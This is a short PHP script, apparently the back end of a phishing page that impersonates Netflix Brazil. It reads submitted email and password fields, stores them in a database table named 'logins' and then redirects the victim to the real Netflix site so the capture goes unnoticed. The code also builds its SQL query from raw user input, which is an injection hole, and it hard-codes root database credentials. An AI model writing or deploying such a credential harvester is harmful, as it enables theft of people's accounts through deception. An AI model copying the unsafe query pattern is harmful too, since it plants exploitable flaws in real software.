<?php

$host = "localhost";
$user = "root";
$password = "admin";
$db = "phishing_demo";

$conn = new mysqli($host, $user, $password, $db);

if ($conn->connect_error) {
    die("Erro na conexão: " . $conn->connect_error);
}

$email = $_POST["email"];
$senha = $_POST["senha"];

$sql = "INSERT INTO logins (email, senha) VALUES ('$email','$senha')";

$conn->query($sql);

$conn->close();

header("Location: https://www.netflix.com/br/");
exit();

?>